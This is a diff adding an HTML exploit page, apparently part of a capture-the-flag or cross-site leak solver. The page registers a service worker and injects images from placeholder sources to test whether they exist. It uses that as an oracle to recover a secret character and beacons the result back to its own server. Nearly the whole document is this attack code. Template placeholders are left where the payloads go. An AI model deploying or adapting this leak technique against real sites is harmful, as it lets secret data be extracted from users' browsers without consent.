@@ -1,0 +1,65 @@
+<!-- used to obtain oracle information about whether images exist or not -->
+<script>
+    // if the service worker has not been registered, then register it, and reload the page
+    if (!navigator.serviceWorker.controller) {
+        navigator.serviceWorker.register('/sw.js');
+        navigator.serviceWorker.ready.then((registration) => {
+            console.log(`A service worker is active: ${registration.active}`);
+            setTimeout(() => {
+                location.reload();
+            }, 1000);
+        });
+    } else {
+        window.images = 0;
+        window.foundChars = [];
+        const sampleImageHTML = `IMG_PLACEHOLDER`;
+        const imageCodes = [
+            /* IMAGE SRC PLACEHOLDER */
+        ];
+        document.addEventListener('DOMContentLoaded', () => {
+            const poller = setInterval(() => {
+                // clearInterval(poller);
+                // return; // disable polling for now
+                if (imageCodes.length == window.images) {
+                    console.log("Image load complete, proceed to delete service worker and prepare for the next stage");
+                    // https://stackoverflow.com/questions/49740931/unregistering-removing-a-service-worker
+                    if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.getRegistrations()
+                        .then(function(registrations) {
+                            for(let registration of registrations) {
+                            if(true){ registration.unregister(); }
+                            }
+                        });
+                    }
+                    if (window.foundChars.length == 1) {
+                        navigator.sendBeacon("/", window.foundChars[0])
+                    } else {
+                        navigator.sendBeacon("/fail", window.foundChars.length);
+                    }
+                    clearInterval(poller);
+                    window.close();
+                }
+            }, 2000);
+        });
+
+        // https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerContainer/ready
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.ready.then((registration) => {
+                console.log(`A service worker is active: ${registration.active}`);
+                // need to wait some more for the service worker to be ready
+                setTimeout(() => {
+                    for (let i = 0; i < imageCodes.length; i++) {
+                        const imageCode = imageCodes[i];
+                        const imageHTML = sampleImageHTML.replace("SRC_PLACEHOLDER", imageCode);
+                        const imageElement = document.createElement("div");
+                        imageElement.innerHTML = imageHTML;
+                        document.body.appendChild(imageElement);
+                    }
+                }, 3000);
+            });
+        } else {
+            console.error("Service workers are not supported.");
+        }
+    }
+</script>
+<!-- INSERT SCRIPT LOOP HERE -->
